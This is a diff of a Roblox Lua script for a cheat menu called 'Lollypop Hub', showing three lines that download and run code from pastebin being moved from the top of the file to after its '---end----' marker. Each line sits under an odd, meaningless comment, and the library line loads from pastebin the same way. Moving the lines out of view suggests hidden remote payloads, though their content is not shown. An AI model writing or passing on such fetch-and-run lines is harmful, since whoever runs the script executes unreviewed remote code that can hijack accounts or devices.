@@ -17,13 +17,6 @@ Text = "lulaslollipop🍭",
 	Duration = 5
 })
 
---game.Players.LocalPlayers.mg
-loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
---Ctrller.P==kikkil
-loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
---3rdstring%"".<LoadLibrary:Hub#%*^>
-loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
-
 local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
 local Window = Library.CreateLib("Lollypop Hub🍭 | V5.6","Ocean")
 
@@ -2458,3 +2451,10 @@ Frame.Parent.Draggable = true
 
 
 ---end----
+
+--game.Players.LocalPlayers.mg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+--Ctrller.P==kikkil
+loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
+--3rdstring%"".<LoadLibrary:Hub#%*^>
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
